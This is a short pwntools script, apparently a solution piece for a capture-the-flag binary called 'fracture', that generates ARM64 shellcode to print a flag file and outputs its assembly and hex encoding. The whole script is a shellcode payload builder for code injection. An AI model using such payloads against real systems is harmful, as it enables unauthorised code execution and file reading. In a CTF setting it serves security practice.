from pwn import *

context.binary = ELF("/home/kali/cybertalent/fracture")

shellcode = shellcraft.cat("FLAG.30b1e2298b0e4e6b192de61142476f9e", 0x4)
shellcode += """
    eor x0, x0, x0
    ret
"""

print(shellcode)
print(enhex(asm(shellcode)))